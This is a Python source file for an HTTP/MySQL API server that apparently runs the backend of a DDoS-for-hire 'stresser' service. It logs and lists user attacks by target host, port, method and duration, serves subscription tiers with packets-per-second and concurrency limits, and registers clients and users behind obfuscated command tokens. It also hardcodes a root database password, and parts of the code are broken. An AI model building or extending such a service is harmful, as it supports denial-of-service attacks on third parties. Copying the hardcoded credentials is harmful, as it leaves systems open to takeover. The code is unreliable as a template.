import socket
from database import *
from http.server import *
import time, cgi, json

clients = []
lh = "localhost"
#global database handler
asd = db(mysql.connector.connect(
    host = lh,
    user = "root",
    #password = "N0Sk4Dz$ll0w3d",
    password = "gaygay555",
    database = "3rf4763ynu34o87r1ws",
    auth_plugin='mysql_native_password'
))

class Client:
    def __init__(self, host, users):
        self.host = host
        self.users = users
        self.last_hb = time.time()

def search(array, element):
    for i in range(len(array)):
        if array[i] == element:
            return True
    return False

def client_connected(host: str, users: int):
    if search(clients, host) == True:
        clients.remove(host)
    else:
        print(f'Client connected ({host}) ({str(users)} users)')
    clients.append(host)
    asd.client_connected(host, users)

def user_attacks(http, ztoken: str, uid: int):
    list = asd.get_user_attacks(uid)
    #http.wfile.write(json.dumps({'hello': 'world', 'received': 'ok'}))
    http.send_response(200)
    for a in list:
        data = json.dumps(
                {
                    'attack_id': str(a.attack_id),
                    'client_id': str(a.client_id),
                    'host': str(a.host),
                    'port': str(a.port),
                    'method': str(a.method),
                    'time': str(a.time), 
                    'attack_cmd': str(a.attack_cmd),
                    'user_id': str(a.user_id),
                    'timestamp': str(a.timestamp.strftime('%m/%d/%Y %H:%M:%S'))
                },
                indent=4
            )
        http.wfile.write(data.encode())
        http.wfile.write(bytes(', \n', "utf-8"))
    if len(list) == 0:
        http.wfile.write(bytes('empty', "utf-8"))
    return True

def reg_new_client(http, ztoken: str, token: str, host: str, permissions: int, max_users: int):
    #check perms
    asd.register_client()
    http.send_response(200)
    http.wfile.write(json.dumps({'status': 'success', 'token': token, 'host': host, 'permissions': permissions, 'max_users': str(max_users)}))
    http.end_headers()
    return True

def get_sublist_all(http, ztoken: str):
    list = asd.get_sublist()
    http.send_response(200)
    for a in list:
        data = json.dumps(
                {
                    'sub_id': str(a.sub_id),
                    'name': str(a.name), 
                    'max_pps': str(a.max_pps),
                    'concurrents': str(a.concurrent),
                    'max_time': str(a.max_time),
                    'cooldown': str(a.cooldown)
                },
                indent=4
            )
        http.wfile.write(data.encode())
        http.wfile.write(bytes(', \n', "utf-8"))
    if len(list) == 0:
        http.wfile.write(bytes('empty', "utf-8"))
    return True

def get_past_requests(http, ztoken: str, count: int):
    list = asd.utoken(ztoken).get_requests(asd, count)
    http.send_response(200)
    for a in list:
        data = json.dumps(
                {
                    'request_id': str(a.request_id),
                    'client_id': str(a.client_id), 
                    'user_id': str(a.user_id),
                    'request_data': str(a.request_data),
                    'timestamp': str(a.timestamp.strftime('%m/%d/%Y %H:%M:%S'))
                },
                indent=4
            )
        http.wfile.write(data.encode())
        http.wfile.write(bytes(', \n', "utf-8"))
    if len(list) == 0:
        http.wfile.write(bytes('empty', "utf-8"))
    return True

#global command map
cmdmap = {
    'f5nm40pvTn3uys201': reg_new_client, 
    '7zBRq936reQ3R78Qr': user_attacks,
    'n8936ERw3r8h7W3fz': get_sublist_all,
    'q8d3R3a7Dz083RT8f': get_past_requests,
    #'8$8rq27@e0uni231x$$qa': client_connected, function only called by api
    #'azawx8NW!@a78NWQQO*DF': asd.client_disconnected, this function will probs be run by the api
    #'azawx8NW!@a78NWQQO*DF': asd.log_attack, used by api
    #'WDWD!28937@E@!nmm#$@z': asd.log_request, used by api
    'aMAWDNn893PW(F*Q1!$4#': asd.register_user,
    'AKDLMQW(@!$$$PAOWO$@O': asd.blacklist_host,
    'WDwA2837Enm8mz': asd.log_user,
}

#method to handle all commands
def handle_command(host: str, cmd: str, args: list, vals: list):
    try:
        #since second should always be token, check if token can run cmd here?

        request_data = cmd + '|'
        for item in vals:
            if isinstance(item, serv) == False:
                request_data = request_data + str(item) + '|'
        asd.log_request(asd.get_host_id(host), asd.utoken(vals[1]).uid, request_data)
        result = cmdmap[cmd](*vals)
        if len(args) > 2:
            if args[2] == 'sdi9f00e4dr2yus23v':
                client_connected(host, vals[2])
        return result
    except Exception as e:
        return False


serverPort = 80 #You can choose any available port; by default, it is 8000

class serv(BaseHTTPRequestHandler):  
    def do_GET(self): #the do_GET method is inherited from BaseHTTPRequestHandler
        try:
            path = str(self.path)
            if path.find("ico") != -1:
                return
            host, port = self.request.getpeername()
            if asd.does_host_exist(host) == False:
                print('[-] Denied host: ' + host)
                return
            requested = path[1:]
            command = requested[:requested.find('?')]
            params = requested[requested.find('?') + 1:].split('&')
            args = ['&sock']
            vals = [self]
            for arg in params:
                vals.append(arg.split('=')[1])
            for p in params:
                args.append(p.split('=')[0])

            #first param in request should always be uid of user making the request

            print(f'[-] Recieved command \'{command}\' from {host}:{port}')
            #for i in range(len(params)):
            #    print('Arguments \'' + args[i] + '\' = ' + vals[i])

            if handle_command(host, command, args, vals) == False: #no webpage
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(bytes("<html><head><title>Test server (it worked!)</title></head>", "utf-8"))
        except Exception as e:
            return

if __name__ == "__main__":        
    webServer = HTTPServer((lh, serverPort), serv)
    print("Server started http://%s:%s/" % (lh, serverPort))  #Server starts
try:
    webServer.serve_forever()
except KeyboardInterrupt:
    pass
webServer.server_close()  #Executes when you hit a keyboard interrupt, closing the server
print("Server stopped.")